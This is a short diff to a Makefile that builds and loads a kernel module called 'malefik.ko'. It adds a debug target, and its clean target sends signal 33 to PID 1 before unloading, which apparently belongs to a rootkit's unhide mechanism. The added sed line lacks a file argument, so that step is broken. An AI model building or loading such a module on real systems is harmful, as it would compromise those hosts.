@@ -7,6 +7,11 @@ modules:
 	@$(MAKE) -C $(KERNEL_ROOT) M=$(shell pwd) modules
 	insmod malefik.ko
 
+debug:
+	sed -i 's/DEBUG 0$/DEBUG 1/g'
+	@$(MAKE) -C $(KERNEL_ROOT) M=$(shell pwd) modules
+	insmod malefik.ko 
+
 clean:
 	kill -33 1
 	rmmod malefik
